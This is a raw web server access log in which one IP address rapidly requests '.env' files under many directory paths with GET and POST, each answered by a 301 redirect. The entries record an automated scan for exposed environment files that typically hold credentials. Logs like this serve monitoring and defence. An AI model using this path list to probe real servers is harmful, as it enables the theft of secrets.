20.70.20.240 - - [27/Jan/2024:19:53:13 +0000] "POST /app/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:14 +0000] "GET /bootstrap/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:14 +0000] "POST /bootstrap/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:14 +0000] "GET /config/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:15 +0000] "POST /config/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:15 +0000] "GET /database/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:15 +0000] "POST /database/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:16 +0000] "GET /public/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:16 +0000] "POST /public/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:17 +0000] "GET /resources/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:17 +0000] "POST /resources/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:17 +0000] "GET /routes/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:18 +0000] "POST /routes/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:18 +0000] "GET /storage/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:18 +0000] "POST /storage/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:19 +0000] "GET /tests/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:19 +0000] "POST /tests/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:19 +0000] "GET /vendor/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:20 +0000] "POST /vendor/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:20 +0000] "GET /app/broadcasting/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.70.20.240 - - [27/Jan/2024:19:53:20 +0000] "POST /app/broadcasting/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
